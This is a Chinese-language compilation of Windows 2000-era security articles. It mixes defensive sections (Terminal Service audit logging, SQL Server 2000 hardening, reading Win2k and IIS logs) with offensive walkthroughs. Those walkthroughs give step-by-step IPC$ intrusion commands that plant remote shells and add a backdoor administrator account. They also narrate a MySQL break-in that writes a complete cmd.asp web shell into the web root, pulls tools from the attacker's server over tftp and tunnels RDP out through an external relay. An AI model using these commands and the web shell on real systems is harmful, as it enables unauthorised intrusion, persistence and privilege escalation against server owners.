　　单独将终端服务（Terminal Service）的日志监控分列出来是有原因的，微软Win2000服务器版中自带的终端服务Terminal Service是一个基于远程桌面协议（RDP）的工具，它的速度非常快，也很稳定，可以成为一个很好的远程管理软件，但是因为这个软件功能强大而且只受到密码的保护，所以也非常的危险，一旦入侵者拥有了管理员密码，就能够像本机一样操作远程服务器。虽然很多人都在使用终端服务来进行远程管理，但是，并不是人人都知道如何对终端服务进行审核。大多数的终端服务器上并没有打开终端登录的日志。其实打开日志审核是很容易的，在管理工具中打开远程控制服务配置（Terminal Service Configration），点击“连接”，右击你想配置的RDP服务（比如RDP-TCP Microsoft RDP 5.0），选中书签“权限”，点击左下角的“高级”，看见上面那个“审核”了么？我们来加入一个Everyone组，这代表所有的用户，然后审核它的“连接”、“断开”、“注销”的成功和“登录”的成功和失败就足够了。审核太多了反而不好，这个审核是记录在安全日志中的，可以从“管理工具”→“日志查看器”中查看。现在什么人什么时候登录我都一清二楚了，可是美中不足的是：这个破烂玩艺居然不记录客户端的IP（只能查看在线用户的IP），而是华而不实地记录什么机器名，倒！要是别人起个PIG的机器名你只好受他的嘲弄了，不知道微软是怎么想的，看来还是不能完全依赖微软呀，我们自己来吧，写个程序，一切搞定，你会C么？不会？VB呢？也不会？Delphi？……什么？你什么编程语言都不会？我倒，毕竟系统管理员不是程序员呀，别急别急，我给你想办法，我们来建立一个bat文件，叫做TSLog.bat。这个文件用来记录登录者的IP，内容如下：time /t >>TSLog.log netstat -n -p tcp ｜ find “:3389”>>TSLog.logstart Explorer。我来解释一下这个文件的含义：第一行是记录用户登录的时间，time /t的意思是直接返回系统时间（如果不加/t，系统会等待你输入新的时间），然后我们用追加符号“>>”把这个时间记入TSLog.log作为日志的时间字段；第二行是记录用户的IP地址，netstat是用来显示当前网络连接状况的命令，-n表示显示IP和端口而不是域名、协议，-ptcp是只显示tcp协议，然后我们用管道符号“｜”把这个命令的结果输出给find命令，从输出结果中查找包含“3389”的行（这就是我们要的客户的IP所在的行，如果你更改了终端服务的端口，这个数值也要作相应的更改）。最后我们同样把这个结果重定向到日志文件TSLog.log中去，于是在TSLog.log文件中，记录格式如下：
　　22:40 TCP　192.168.12.28:3389
　　192.168.10.123:4903　ESTABLISHED 22:54 TCP　192.168.12.28:338
　　192.168.12.29:1039　ESTABLISHED也就是说只要这个TSLog.bat文件一运行，所有连在3389端口上的IP都会被记录，那么如何让这个批处理文件自动运行呢？我们知道，终端服务允许我们为用户自定义起始的程序，在终端服务配置中，我们覆盖用户的登录脚本设置并指定TSLog.bat为用户登录时需要打开的脚本，这样每个用户登录后都必须执行这个脚本，因为默认的脚本（相当于shell环境）是Explorer（资源管理器），所以我在TSLog.bat的最后一行加上了启动Explorer的命令start Explorer。如果不加这一行命令，用户是没有办法进入桌面的！当然，如果你只需要给用户特定的shell，例如:cmd.exe或者word.exe你也可以把start Explorer替换成任意的shell。这个脚本也可以有其他的写法，作为系统管理员，你完全可以自由发挥你的想象力、自由利用自己的资源，例如，写一个脚本把每个登录用户的IP发送到自己的信箱，对于重要的服务器也是一个很好的方法。正常情况下一般的用户没有查看终端服务设置的权限，所以他不会知道你对登录进行了IP审核，只要把TSLog.bat文件和TSLog.log文件放在比较隐蔽的目录里就足够了。不过，需要注意的是这只是一个简单的终端服务日志策略，并没有太多的安全保障措施和权限机制。如果服务器有更高的安全要求，那还是需要通过编程或购买入侵监测软件来完成的。
　　8.陷阱技术
　　早期的陷阱技术只是一个伪装的端口服务用来监测扫描，随着“矛”和“盾”的不断升级，现在的陷阱服务或者陷阱主机已经越来越完善，越来越像真正的服务，不仅能截获半开式扫描，还能伪装服务器一端的回应并记录入侵者的行为，从而帮助判断入侵者的身份。我本人对于陷阱技术并不是非常感兴趣，一来从技术人员角度来说，低调行事更符合安全的原则；二来陷阱主机反而成为入侵者跳板的情况并不仅仅出现在小说中，在现实生活中也屡见不鲜。如果架设了陷阱反而被用来入侵，那真是偷鸡不成了蚀把米。记得CoolFire说过一句话，可以用来作为对陷阱技术介绍的一个总结：在不了解情况时，不要随便进入别人的系统，因为你永远不能事先知道系统管理员是真的白痴或者是伪装成白痴的天才……
　　入侵监测的初步介绍就到这里，在实际运用中，系统管理员对基础知识掌握的情况直接关系到他的安全敏感度，只有身经百战知识丰富，仔细小心的系统管理员才能从一点点的蛛丝马迹中发现入侵者的影子，未雨绸缪，阻止入侵的行动。
　　  



【入侵步骤】
好了现在来跟我一起建立IPC$主机连接
l        在“开始”-运行-“CMD”
下面开始经典的模式
l        1. C:\>net use \\127.0.0.1\IPC$ "" /user:"admintitrators" 
l        这是用《流光》扫到的用户名是administrators，密码为"空"的IP地址(空口令?哇,运气好到家了)，如果是打算攻击的话，就可以用这样的命令来与127.0.0.1建立一个连接，因为密码为"空"，所以第一个引号处就不用输入，后面一个双引号里的是用户名，输入administrators，命令即可成功完成。
l        　　
l        2. C:\>copy srv.exe \\127.0.0.1\admin$ 
l        先复制srv.exe上去，在流光的Tools目录下就有（这里的$是指admin用户的c:\winnt\system32\，大家还可以使用c$、d$，意思是C盘与D盘，这看你要复制到什么地方去了）。
l        　　
l        3. C:\>net time \\127.0.0.1 
l        查查时间，发现127.0.0.1 的当前时间是 2002/3/19 上午 11:00，命令成功完成
l        4. C:\>at \\127.0.0.1 11:05 srv.exe 
l        用at命令启动srv.exe吧（这里设置的时间要比主机时间快，不然你怎么启动啊，呵呵！） 
l        　　
l        5. C:\>net time \\127.0.0.1
l        再查查到时间没有？如果127.0.0.1 的当前时间是 2002/3/19 上午 11:05，那就准备开始下面的命令。
                    6C:\>copy ntlm.exe \\127.0.0.1\admin$
l        用Copy命令把ntlm.exe上传到主机上（ntlm.exe也是在《流光》的Tools目录中）。
                     7. C:\>telnet 127.0.0.1 99 
l        这里会用到Telnet命令吧，注意端口是99。Telnet默认的是23端口，但是我们使用的是SRV在对方计算机中为我们建立一个99端口的Shell。
l        虽然我们可以Telnet上去了，但是SRV是一次性的，下次登录还要再激活！所以我们打算建立一个Telnet服务！这就要用到ntlm了
l        8. C:\WINNT\system32>ntlm 
l        输入ntlm启动（这里的C:\WINNT\system32>指的是对方计算机，运行ntlm其实是让这个程序在对方计算机上运行）。当出现"DONE"的时候，就说明已经启动正常。然后使用"net start telnet"来开启Telnet服务！ 
l        
l        9. Telnet 127.0.0.1，接着输入用户名与密码就进入对方了，操作就像在DOS上操作一样简单！(然后你想做什么?想做什么就做什么吧,哈哈)
l        
l        为了以防万一,我们再把guest激活加到管理组 
l        10. C:\>net user guest /active:yes 
l        将对方的Guest用户激活
l        
l        11. C:\>net user guest 1234 
l        将Guest的密码改为1234,或者你要设定的密码
l        
l        12. C:\>net localgroup administrators guest /add 
l        将Guest变为Administrator^_^(如果管理员密码更改，guest帐号没改变的话，下次我们可以用guest再次访问这台计算机)
                 现在再来讲讲Telent 入侵方面的知识吧A  Telnet 的作用 1）控制主机的第一手段
             2）用来做跳板
B  NTML验证：所谓NTLM是一种“身份验证机制”，主要是用于Windows NT 4.0的，需要使用“消息队列”工具来制作证书。C  去除的NTML验证工具（有手工的方法，比较麻烦所以算了！）
   Opentelnt   http://www.4567.cn/article/Soft/Class25/Class81/200408/1169.asp Opentelnet.exe的用法： 
OpenTelnet.exe \\server <帐号> <密码> <NTLM认证方式> <Telnet端口>
比如下面的：
C:\>OpenTelnet.exe \\192.168.1.2 administrator 123456 1 99
再来讲讲Telnet 的高级入侵吧
从上面的内容可以知道，即使计算机使用了NTML验证入侵者还是可以轻松的去除NTML验证来实现Telent入侵，如果入侵者使用23号端口来入侵，那么管理者可以轻松的发现他们，但是如果我们不会通过默认的23号端口来入侵，那么我们是如何来修改Telnet  端口，又如何来修改Telnet服务来隐蔽行踪呢！
X-scan   http://download.chinaitlab.com/soft/7021.htm
用来扫描弱口令
采用多线程方式对指定IP地址段(或单机)进行安全漏洞检测，支持插件功能，提供了图形界面和命令行两种操作方式，扫描内容包括：远程服务类型、操作系统类型及版本，各种弱口令漏洞、后门、应用服务漏洞、网络设备漏洞、拒绝服务漏洞等二十几个大类
Opentelent 已经介绍了
APROMan  http://www.jk520.com/SoftView/Soft_3079.htm
用来查杀进程
AProMan v1.2 - Process Manager  
一个2000/XP下基于命令行的进程工具，可查看进程，端口进程关联关系，kill指定进程，还可以把进程和模块列表导出到文本文件中。
c:\AProMan.exe -a 显示所有进程
c:\AProMan.exe -p : 显示端口进程关联关系 (需Administrator权限)
c:\AProMan.exe -t [PID] : 杀掉指定进程号的进程
c:\AProMan.exe -f [FileName] : 把进程及模块信息存入文件
Instsrv   http://hackbase.com/down/43/20040917/5106.htm
命令格式如下： 用来给主机安装服务
   instsrv  服务名  程序路径
服务名：就是在『服务』里面显示的名称！！
程序路径：就是我们要创建的服务的绝对路径！！！这里要加上后缀名哈！不然会出错哦
注意：创建服务后，我们要马上运行的话，就要用：
net start 服务名（这个没有什么说的）
来启动服务！！不然该服务会在系统下一次启动时，启动！！
哎哟！累死了，具体的入侵步骤下篇再写吧！先把工具介绍给大家，大家先熟悉熟悉！    
MM即将推出漏洞的入侵  木马的入侵  和隐藏技术  和留后门与清脚印 等等！ （当然是前提大家喜欢！）
                                                                                     

【关于mysql+win2k的入侵】
关于mysql+win2k的入侵  

--------------------------------------------------------------------------------
文章作者:     文章来源:陈十三哥     发布时间:2005-05-17 22:22:07  
用mysql客户端连接试试： 

　　F:\cmd〉mysql -u root -h www.target.net 
　　Welcome to the MySQL monitor. Commands end with ; or \g. 
　　Your MySQL connection id is 3038 to server version: 3.23.21-beta 
　　Type 'help;' or '\h' for help. Type '\c' to clear the buffer 
　　mysql〉 

　　是默认的空密码，那么我们就可以利用这个漏洞来做点什么了。如果是MS-SQL数据库的话就好办啦，直接可以用xp_cmdshell来运行系统命令，但是可惜的是mysql没有类似MS-SQL那样的扩展存储过程。 

　　现在我们可以利用这个漏洞来做三件事情： 

〈1〉搜索mysql数据库里面的内容，看能不能找出一些有用的敏感信息，我找了一会儿就不想找了，呵呵 

〈2〉读取服务器上的任何文件，当然前提是知道文件的物理路径 

〈3〉以启动mysql服务用户的权限往服务器上写文件，前提是这个文件要不存在的，就是说不能覆盖文件 


　　如果我们知道IIS主目录的物理路径的话,我们就可以往上面写一个ASP上去，然后通过IE来执行系统命令。怎么得到IIS目录的物理路径呢？天知道！ 

　　没办法，猜吧。。。。。。先在mysql默认数据库test中建一个表tmp，这个表只有一个字段str,类型为TEXT, 

　　mysql〉 use test;create table tmp（str TEXT）; 
　　Database changed 
　　Query OK, 0 rows affected （0.05 sec） 

　　开始猜测IIS主目录的物理路径，c:\inetpub\wwwroot，c:\www，c:\wwwroot，c:\inetpub\web,d:\web，d:\wwwroot，都不对，55555。大概猜测到第10次，我的mysql客户端回显信息如下： 

mysql〉 load data infile "d:\\www\\gb\\about\\about.htm" into table tmp; 
Query OK, 235 rows affected （0.05 sec） 
Records: 235 Deleted: 0 Skipped: 0 Warnings: 0 

　　哈哈哈，猜中了，IIS主目录的物理路径是d:\www，因为上面的文件的虚拟路径是http://www.target.net/gb/about/about.htm，看来我得到一个shell了，呵呵。 

　　接下来我们就可以往d:\www\gb\about里面写一个ASP文件进去，然后通过http://www.target.net/gb/about/cmd.asp来执行系统命令了。然后在网上找来一个现成的cmd.asp，懒的自己去写了：）。Cmd.asp如下： 
-------------------------------cmd.asp---------------------------------------- 

〈% Dim oScript 
Dim oScriptNet 
Dim oFileSys, oFile 
Dim szCMD, szTempFile 
On Error Resume Next 
Set oScript = Server.CreateObject（""WSCRIPT.SHELL""） 
Set oScriptNet = Server.CreateObject（""WSCRIPT.NETWORK""） 
Set oFileSys = Server.CreateObject（""Scripting.Filesys temObject""） 
szCMD = Request.FORM（"".CMD""） 
If （szCMD 〈〉 """"） Then 
szTempFile = ""C:\" & oFileSys.GetTempName（） 
Call oScript.Run （""cmd.exe /c "" & szCMD & "" 〉 "" & szTempFile, 0, True） 
Set oFile = oFileSys.OpenTextFile （szTempFile, 1, False, 0） 
End If %〉 
〈HTML〉〈BODY〉〈FORM action=""〈%= Request.ServerVariables（""URL""） %〉"" method=""POST""〉 
〈input type=text name="".CMD"" size=45 values=""〈%= szCMD %〉""〉〈input type=submit values=""Run""〉〈/FORM〉〈PRE〉 
〈% If （IsObject（oFile）） Then 
On Error Resume Next 
Response.Write Server.HTMLEncode（oFile.ReadAll） 
oFile.Close 
Call oFileSys.DeleteFile（szTempFile, True） 
End If%〉 
〈/BODY〉〈/HTML〉 

----------------------------end of cmd.asp----------------------------------- 

　　由于往mysql数据库中插入数据的时候，会过滤特殊字符什么的，例如双引号之类的，特别麻烦。各位留意没有，上面的ASP语句中，都是两个双引号一起的，这样才能写进去，原来是一个双引号的。然后我在数据库中再建一个表： 

mysql〉 use test;create table cmd（str TEXT）; 
Database changed 
Query OK, 0 rows affected （0.05 sec） 

　　然后用如下语句，一句一句把上面的ASP写进去: 

mysql〉 insert into cmd valuess（"一行一行的asp代码，呵呵"）; 

　　为什么不全部一起写进去呢？呵呵，换行后，一会儿导出的文件就会有特殊字符了，asp就不能正常运行了，只能辛苦点一行一行写了。然后把asp文件导到服务器上： 

mysql〉select * from cmd into outfile "d:\\www\\gb\\abou\\cmd.asp"; 

　　然后把我们刚才建的表都删除掉： 

mysql〉 use test; drop table tmp; drop table cmd; 

　　ok!我们得到一个shell了，虽然权限不高，但毕竟已经向取得admin权限迈出一大步了，不是吗，呵呵。做这个asp文件可花了我不少时间哦。现在我们利用这个shell来收集系统信息，尝试取得admin权限。 


〈1〉先看一下系统文件权限设置如何： 
c:\ Everyone:（OI）（CI）F 
d:\ \xxx:（OI）（CI）（DENY）（特殊访问:） 
DELETE 
READ_CONTROL 
WRITE_DAC 
WRITE_OWNER 
STANDARD_RIGHTS_REQUIRED 
FILE_READ_DATA 
FILE_WRITE_DATA 
FILE_APPEND_DATA 
FILE_READ_EA 
FILE_WRITE_EA 
FILE_EXECUTE 
FILE_DELETE_CHILD 
FILE_READ_ATTRIBUTES 
FILE_WRITE_ATTRIBUTES 

Everyone:（OI）（CI）F 

　　看来我们现在就可以读写硬盘上的任何文件了，现在就可以改他的首页了，但这样做没意思，对不对，我们的目标是取得admin权限，呵呵。 
〈2〉然后搜索一下硬盘上都有些什么文件： 

c:\Program Files 的目录下有两个比较有意思的文件， 

2000-12-19 13:10 　Serv-U 
2001-01-20 22:43 绿色警戒 

把Serv-U里面的用户和密码读出来看看后，没有什么用处，然后进入绿色警戒目录看看，呵呵，除了log外，什么都没有，呵呵。 

〈3〉再看看都有哪些用户： 

Guest IUSR_SERVER_1 IUSR_SERVER-2 
IWAM_SERVER_1 IWAM_SERVER-2 ceo[他们CEO的帐号J] 
TsInternetUser 

　　管理员有ceo 和target\Domain Admins，看来这台机器是他们域中的一台服务器。开始本来想给ceo下一个套，在他的启动目录里放一个程序，但后来看到这个帐号已经几个月没登陆了，就放弃了。 

〈4〉看看启动了那些服务，这几个比较有意思, 看来都是默认的： 

Task Scheduler 
Simple Mail Transport Protocol （SMTP） 
Task Scheduler 

〈5〉看看网络状况，这几个比较有意思： 

TCP 0.0.0.0:21 0.0.0.0:0 LISTENING 
TCP 0.0.0.0:119 0.0.0.0:0 LISTENING 
TCP 192.168.1.3:3389 0.0.0.0:0 LISTENING 

　　看来有TermService，不过在网卡上做了TCP/IP过滤，只对内网开放，那么我们就来 




〈6〉看看网卡设置信息： 

Ethernet adapter 本地连接: 
Connection-specific DNS Suffix . : 
Description . . . . . . . . . . . : Realtek RTL8139（A） PCI Fast Ethernet Adapter 
Physical Address. . . . . . . . . : 00-E0-4C-68-C4-B2 
DHCP Enabled. . . . . . . . . . . : No 
IP Address. . . . . . . . . . . . : 192.168.1.3 
Subnet Mask . . . . . . . . . . . : 255.255.255.0 
Default Gateway . . . . . . . . . : 
DNS Servers . . . . . . . . . . . : 
Ethernet adapter 本地连接 2: 
Connection-specific DNS Suffix . : 
Description . . . . . . . . . . . : Realtek RTL8139（A） PCI Fast Ethernet Adapter#2 
Physical Address. . . . . . . . . : 00-E0-4C-68-B8-FC 
DHCP Enabled. . . . . . . . . . . : No 
IP Address. . . . . . . . . . . . :xxx 
Subnet Mask . . . . . . . . . . . : 
Default Gateway . . . . . . . . . : 

　　经过上面的一些步骤，对这台服务器的设置情况就有了一个大概的了解。如何取得admin权限？netdde?pipeupadmin?呵呵，无法利用，没有可利用的可以登陆的用户。下套？等到什么时候，呵呵。 

　　Okok!让我们来看看这个系统都打了些什么补丁。怎么查看？呵呵，打了补丁后，信息都会存贮在注册表中，查询注册表中的这个键值就行了："HKLM\Software\Microsoft\Windows NT\CurrentVersion\hotfix"，这样的话，我们得上传一个reg.exe[M$ Resource Kit中的命令行注册表编辑器]到服务器里面，我们才能操作他的注册表。开始我想用先写一个ftp脚本，然后ftp -s:cmd.txt让他到我的服务器来下载，但结果失败了，后来才想起他做了TCP/IP过滤，5555，我记性真不好。怎么办呢？有办法，用tftp来传输。我先在我的服务器上安装了一个Cisco TFTP Server，然后在目标机器上运行tftp -I www.eyas.org GET reg.exe，呵呵，传输过去咯。然后运行 
REG QUERY "HKLM\Software\Microsoft\Windows NT\CurrentVersion\hotfix" 

　　返回数据如下： 
Listing of [Software\Microsoft\Windows NT\CurrentVersion\hotfix] 

[Q147222]==〉这个不知道是什么东西，好象默认2k机器上都有 
[Q269862]==〉Q269862_W2K_SP2_x86_CN.EXE==〉Microsoft IIS Unicode解码目录遍历漏洞! 
[Q277873]==〉Q277873_W2K_sp2_x86_CN.EXE==〉Microsoft IIS CGI文件名检查漏洞! 

　　呵呵，==〉和后面的说明是我加上去的，不是注册表中的。看来管理员不太勤快啊，只打了两个补丁。 

　　哈哈！到了这一步，大家想到怎么取得admin权限了吗？呵呵，你一定也想到了，他的机器开了TermService服务，但windows2000登陆验证可被绕过的漏洞没有安装补丁，此补丁为Q270676_W2K_SP2_x86_CN.EXE。由此看来，管理员只是删除了帮助法文件，而没有打补丁。用dir c:\winnt\help\win*验证一下，果然没有熟悉的输入法帮助文件。敌人没有输入法，我们帮他造，hoho~~别忘了我们可以往任何地方写文件哦。 

　　嘻嘻，咱们也别高兴的太早了，别忘了他的机器做了TCP/IP过滤哦，我们是没有办法连接到他的3389端口的。不要着急，不要着急，让我们先来看看他的TCP/IP过滤的设置情况。怎么看呢？老办法，查看注册表里面的键值啦。用刚才的reg.exe查询 

〈1〉reg QUERY "HKLM\sys tem\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" 
Listing of [sys tem\CurrentControlSet\Services\Tcpip\Parameters\Interfaces] 
[{4B41CFFB-4A20-42F8-9087-A89FE71FD8F4}] 
[{612A3142-DB85-4D4E-8028-81A9EB4D6A51}] 

〈2〉reg QUERY "HKLM\sys tem\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\ 
{4B41CFFB-4A20-42F8-9087-A89FE71FD8F4}" 
Listing of [sys tem\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\ 
{4B41CFFB-4A20-42F8-9087-A89FE71FD8F4}] 
MULTI_SZ IPAddress ; 
MULTI_SZ TCPAllowedPorts 25;53;80;110;3306; 
MULTI_SZ UDPAllowedPorts 0; 
MULTI_SZ RawIPAllowedProtocols 0; 

〈3〉reg QUERY "HKLM\sys tem\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\ 
{612A3142-DB85-4D4E-8028-81A9EB4D6A51}" 
Listing of [sys tem\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\ 
{612A3142-DB85-4D4E-8028-81A9EB4D6A51}] 
MULTI_SZ IPAddress 192.168.1.3; 
MULTI_SZ TCPAllowedPorts 0; 
MULTI_SZ UDPAllowedPorts 0; 
MULTI_SZ RawIPAllowedProtocols 0; 



　　篇幅关系，我过滤了一些输出。第二次查询的是外网网卡，我们可以得知只开放了TCP 25，53，80，110，3306，UDP全部，IP协议全部。第三次查询的是内网网卡，没有任何限制。 
现在我们可以把输入法帮助文件上传到他的c:\winnt\help目录下去，然后如果能连接到他的3389端口的话，我们就可以得到admin权限了。问题的关键是外网网卡做了TCP/IP限制。55555，怎么办呢？如何突破？有办法！我们可以利用socket转发和反弹端口技术，照样可以连接到敌人的TermService！ 

具体过程如下： 

〈1〉在我的另一台服务器www.eyas2.org[我称他为AgentMaster]上运行一个程序，监听3389端口[等待我的TermClient去连接]，监听11111端口[等待www.target.net来连接]，当然了，第2个端口可以随便选，第1个端口选其他的话，就要相应的修改TermClient，比较麻烦 

〈2〉在www.target.net[我称他为AgentSlave]运行另外一个程序， 先连接到www.eyas2.org:11111，再连接到192.168.1.3:3389[敌人服务器内网的IP] 

〈3〉 我的TermClient连接到www.eyas2.org:3389，这样，数据通道就全部建立好了。接下来，两个程序就忠实的为我们转发数据了。 
注意：www.eyas2.org和www.eyas.org可以为同一台服务器，但要保证www.target.net能connect上你的服务器。192.168.1.3也可以换为他内网的任何一个IP。这样，当我用TermClient连接到www.eyas2.org的时候，其实是连接到www.target.net。当熟悉的登陆界面出现在我面前，我熟练的调出输入法，取得admin权限，呵呵，心里还有那么一点点成就感！ 

　　关于〈利用socket转发和反弹端口技术突破防火墙进入内〉的详细说明和程序原代码解读请参见我另一篇文章。 

　　简要的回顾一下：发现mysql漏洞==〉凭直觉猜中IIS物理路径==〉写一个cmd.asp文件上去得到一个shell==〉利用系统配置错误取得admin权限接下来要做的事情，就是把漏洞通知他们的网管了[我可不敢直接告诉他们CEO，呵呵]，本来想在那机器上装个sniff什么的，再用来做跳板进一步尝试入侵他的内网，但后来想想还是算了，呵呵

【关于SQL Server 2000的安全配置】
关于SQL Server 2000的安全配置 

　　SQL Server 2000的安全配置在进行SQL Server 2000数据库的安全配置之前，首先你必须对操作系统进行安全配置，保证你的操作系统处于安全状态。然后对你要使用的操作数据库软件（程序）进行必要的安全审核，比如对ASP、PHP等脚本，这是很多基于数据库的WEB应用常出现的安全隐患，对于脚本主要是一个过滤问题，需要过滤一些类似“,;@/”等字符，防止破坏者构造恶意的SQL语句。接着，安装SQL Server2000后请打上补丁sp3。

　　1、使用安全的密码策略  

　　我们把密码策略摆在所有安全配置的第一步，请注意，很多数据库帐号的密码过于简单，这跟系统密码过于简单是一个道理。对于sa更应该注意，同时不要让sa帐号的密码写于应用程序或者脚本中。健壮的密码是安全的第一步！SQL Server2000安装的时候，如果是使用混合模式，那么就需要输入sa的密码，除非你确认必须使用空密码。这比以前的版本有所改进。同时养成定期修改密码的好习惯。数据库管理员应该定期查看是否有不符合密码要求的帐号。  
　　比如使用下面的SQL语句：  
　　Use master  
　　Select name,Password from syslogins where password is null  

　　2、使用安全的帐号策略  

　　由于SQL Server不能更改sa用户名称，也不能删除这个超级用户，所以，我们必须对这个帐号进行最强的保护，当然，包括使用一个非常强壮的密码，最好不要在数据库应用中使用sa帐号，只有当没有其它方法登录到 SQL Server 实例（例如，当其它系统管理员不可用或忘记了密码）时才使用 sa。建议数据库管理员新建立个拥有与sa一样权限的超级用户来管理数据库。安全的帐号策略还包括不要让管理员权限的帐号泛滥。  

　　SQL Server的认证模式有Windows身份认证和混合身份认证两种。如果数据库管理员不希望操作系统管理员来通过操作系统登陆来接触数据库的话，可以在帐号管理中把系统帐号“BUILTIN\Administrators”删除。不过这样做的结果是一旦sa帐号忘记密码的话，就没有办法来恢复了。很多主机使用数据库应用只是用来做查询、修改等简单功能的，请根据实际需要分配帐号，并赋予仅仅能够满足应用要求和需要的权限。比如，只要查询功能的，那么就使用一个简单的public帐号能够select就可以了。  

　　3、加强数据库日志的记录  

　　审核数据库登录事件的“失败和成功”，在实例属性中选择“安全性”，将其中的审核级别选定为全部，这样在数据库系统和操作系统日志里面，就详细记录了所有帐号的登录事件。请定期查看SQL Server日志检查是否有可疑的登录事件发生，或者使用DOS命令。 
　　findstr /C:"登录" d:\Microsoft SQL Server\MSSQL\LOG\*.*  

　　4、管理扩展存储过程  

　　对存储过程进行大手术，并且对帐号调用扩展存储过程的权限要慎重。其实在多数应用中根本用不到多少系统的存储过程，而SQL Server的这么多系统存储过程只是用来适应广大用户需求的，所以请删除不必要的存储过程，因为有些系统的存储过程能很容易地被人利用起来提升权限或进行破坏。如果你不需要扩展存储过程xp_cmdshell请把它去掉。使用这个SQL语句：  
　　use master 
　　sp_dropextendedproc xp_cmdshell 

　　xp_cmdshell是进入操作系统的最佳捷径，是数据库留给操作系统的一个大后门。如果你需要这个存储过程，请用这个语句也可以恢复过来。  
　　sp_addextendedproc xp_cmdshell, xpsql70.dll 

　　如果你不需要请丢弃OLE自动存储过程（会造成管理器中的某些特征不能使用），这些过程包括如下：  
　　Sp_OACreate Sp_OADestroy Sp_OAGetErrorInfo Sp_OAGetProperty  Sp_OAMethod Sp_OASetProperty Sp_OAStop 

　　去掉不需要的注册表访问的存储过程，注册表存储过程甚至能够读出操作系统管理员的密码来，如下：  
　　Xp_regaddmultistring Xp_regdeletekey Xp_regdeletevalue Xp_regenumvalues Xp_regread Xp_regremovemultistring  Xp_regwrite  

　　还有一些其他的扩展存储过程，你也最好检查检查。在处理存储过程的时候，请确认一下，避免造成对数据库或应用程序的伤害。 

　　5、使用协议加密  

　　SQL Server 2000使用的Tabular Data Stream协议来进行网络数据交换，如果不加密的话，所有的网络传输都是明文的，包括密码、数据库内容等等，这是一个很大的安全威胁。能被人在网络中截获到他们需要的东西，包括数据库帐号和密码。所以，在条件容许情况下，最好使用SSL来加密协议，当然，你需要一个证书来支持。 

　　6、不要让人随便探测到你的TCP/IP端口  

　　默认情况下，SQL Server使用1433端口监听，很多人都说SQL Server配置的时候要把这个端口改变，这样别人就不能很容易地知道使用的什么端口了。可惜，通过微软未公开的1434端口的UDP探测可以很容易知道SQL Server使用的什么TCP/IP端口了。不过微软还是考虑到了这个问题，毕竟公开而且开放的端口会引起不必要的麻烦。在实例属性中选择TCP/IP协议的属性。选择隐藏 SQL Server 实例。如果隐藏了 SQL Server 实例，则将禁止对试图枚举网络上现有的 SQL Server 实例的客户端所发出的广播作出响应。这样，别人就不能用1434来探测你的TCP/IP端口了（除非用Port Scan）。

　　7、修改TCP/IP使用的端口  

　　请在上一步配置的基础上，更改原默认的1433端口。在实例属性中选择网络配置中的TCP/IP协议的属性，将TCP/IP使用的默认端口变为其他端口。

　　8、拒绝来自1434端口的探测 

　　由于1434端口探测没有限制，能够被别人探测到一些数据库信息，而且还可能遭到DOS攻击让数据库服务器的CPU负荷增大，所以对Windows 2000操作系统来说，在IPSec过滤拒绝掉1434端口的UDP通讯，可以尽可能地隐藏你的SQL Server。 

　　9、对网络连接进行IP限制  

　　SQL Server 2000数据库系统本身没有提供网络连接的安全解决办法，但是Windows 2000提供了这样的安全机制。使用操作系统自己的IPSec可以实现IP数据包的安全性。请对IP连接进行限制，只保证自己的IP能够访问，也拒绝其他IP进行的端口连接，把来自网络上的安全威胁进行有效的控制。关于IPSec的使用请参看： 
http://www.microsoft.com/china/technet/security/ipsecloc.asp ; 

　　上面主要介绍的一些SQL Server的安全配置，经过以上的配置，可以让SQL Server本身具备足够的安全防范能力。当然，更主要的还是要加强内部的安全控制和管理员的安全培训，而且安全性问题是一个长期的解决过程，还需要以后进行更多的安全维护。
 


【关于win2k的日志！】
读win2k的日志对于每一个网络管理员来说是家常便饭了，甚至可以说，它就是你每天早上打开电脑后的第一件要事，但是，个人上网用户很少有人去注意安全日志，下面我简要谈谈win2k的日志，呵呵~~其实上面十三已经说的很详细了~~
1。系统自带日志
  进入控制面板，选择“事件管理器‘，打开事件管理器，你可以看到三类日志：应用程序日志，安全日  志和系统日志（如果你的win2k是svr以上版本，并且是域控制器的话，还会有一个DNS日志）
（1）应用程序日志主要记录一些重要应用程序所产生的错误或成功信息，
     需要注意的是，这里所指的应用程序不仅包刮了第三方软件，还包刮一
     些win2k系统中的一些应用程序
（2）系统日志主要记录win2k操作系统的组件所产生的日志，例如IIS自带
       的ftp，由于IIS属于windows组件的一部分，所以其中的ftp必然也属
      于windows的组件
（3）安全日志记录的是一些安全事件,例如，给你的某个磁盘针对某个或某组用户增加了审核之后，
     就可以通过日志来观察该用户或该用户组对磁盘的操作情况，另外，还有指定的用户或组的登陆情     况等
  很多人认为读日志是件比较简单的事情，毕竟微软的日志还是比较明了的，有很多的文字叙述，但是
  很多人却往往忽略了另外一些看起来不重要的东西
  日志中，我们最先读的一般是其描述，除此，还有几个需要注意的：日期，来源，类型和事件ID，
  至于计算机，对于个人用户来说，一般都是本地计算机了。

  日期：如果是被入侵，从这里可以推断出时间，有的时候掌握被攻击或入侵的时间是很重要的
        例如：你被网页上的恶意代码给黑掉了，通过时间结合windows缓存中的网页文件，就
        可以确定是哪个网站黑的你
  来源：要解决问题至少要先知道是什么程序出了问题吧
  类型：分为信息、警告、错误三种
  事件ID：这是最容易被大家忽视的地方，微软为每个事件都规定了不同的事件ID。所以当你无法理解
          日志中所记录的错误或其他信息时可以到微软的技术支持站点去搜索这个事件ID，就可以获得
          解决的方案
   
2。解读IIS日志
   上面的方法是针对win2k系统自带的日志工具而言的，而windows的一大组件IIS其自身也带有日志功能
   首先，我们要确定IIS日志的位置：C:\WINNT\system32\LogFiles 在这个目录下，所有目录都是用来   存放日志文件的。由于我实验时只启动了ftp和web server两个服务，所以这里有两个文件夹，  MSFTPSVR1和W3SVC1，这两个文件夹分别对应了ftp和web服务的日志
  随意打开一个文件夹，会发现一些log文件，命名方式为：ex031028.log，这些文件名是以产生时间来
  命名的，也就是说我们可以确定该日志和生成时间为：2003年10月28日
  打开文件后，读取一条，内容为：
  2003-10-28 09:30:25 192.168.0.1 - 192.168.0.2 80 GET /test.txt - 200 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0).
  这个过程的意思就是：192.168.0.1的主机向本机（地址为192.168.0.2）的80端口（默认的web服务端口）提交get请求，要求查看test.txt。
